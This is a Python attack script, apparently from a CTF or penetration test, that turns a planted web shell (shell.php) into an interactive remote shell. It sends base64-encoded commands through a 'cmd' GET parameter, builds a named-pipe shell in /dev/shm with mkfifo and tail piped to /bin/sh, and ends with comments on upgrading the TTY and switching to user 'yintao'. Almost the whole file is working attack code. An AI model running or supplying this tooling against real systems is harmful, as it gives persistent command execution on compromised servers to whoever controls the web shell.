#!/usr/bin/python3

import requests, sys, signal, time, pdb, threading
from base64 import b64encode
from random import randrange


class AllTheReads(object):

    def __init__(self, interval=1):
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()


    def run(self):
        readoutput = """/bin/cat %s """ % (stdout)
        clearoutput = """echo '' > %s """ % (stdout)

        while True:
            output =RunCmd(readoutput)

            if output:
                RunCmd(clearoutput)
                print(output)
            
            time.sleep(self.interval)


# Ctrl + C = Exit
def sig_handler(sig, frame):
    
    print("\n\n [*] Exiting...\n")
    RunCmd(erasestdin)
    RunCmd(erasestdout)
    sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)


# Pasamos los comandos a b64 para evitar caracteres especiales
def RunCmd(cmd):
    cmd = cmd.encode("utf-8")
    cmd = b64encode(cmd).decode("utf-8")

    payload = {
        'cmd' : 'echo "%s" | base64 -d | /bin/sh' % (cmd)
    }

    result = (requests.get('http://127.0.0.1/shell.php', params=payload, timeout=5).text).strip()

    return result


def WriteCmd(cmd):
    cmd = cmd.encode("utf-8")
    cmd = b64encode(cmd).decode("utf-8")

    payload = {
        'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
    }

    result = (requests.get('http://127.0.0.1/shell.php', params=payload, timeout=5).text).strip()

    return result


def ReadCmd():
    GetOutput= """/bin/cat %s """ % (stdout)
    output = RunCmd(GetOutput)
    return output


def SetupShell():
    NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)

    try:
        RunCmd(NamedPipes)
    except:
        None
    
    return None


# Variables
global stind, stdout
session = randrange(1000,9999)
stdin = "/dev/shm/input.%s" % session
stdout = "/dev/shm/output.%s" % session
erasestdin = "/bin/sh %s" % stdin
erasestdout = "/bin/sh %s" % stdout


# pdb.set_trace()

SetupShell()
ReadingTheThings = AllTheReads()

while True:
    cmd = input("$~ ")
    WriteCmd(cmd + "\n")
    time.sleep(1)


# rlwrap python3 getShell.py 
# script /dev/null -c bash
# su yintao